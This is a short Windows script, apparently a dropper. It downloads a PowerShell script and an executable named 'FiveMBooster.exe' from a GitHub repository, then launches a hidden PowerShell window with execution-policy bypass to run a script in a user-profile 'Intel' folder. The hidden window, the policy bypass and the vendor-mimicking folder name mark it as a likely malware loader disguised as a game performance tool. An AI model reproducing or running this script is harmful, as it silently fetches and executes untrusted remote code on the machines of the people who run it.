Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Alinsmekeru/Intel3/main/auto.ps1' -O auto.ps1
Invoke-WebRequest -Uri 'https://github.com/Alinsmekeru/Intel3/blob/main/FiveMBooster.exe' -O FiveMBooster.exe
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -WindowStyle Hidden -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File ""%userprofile%\Intel\Intel.ps1""'}"
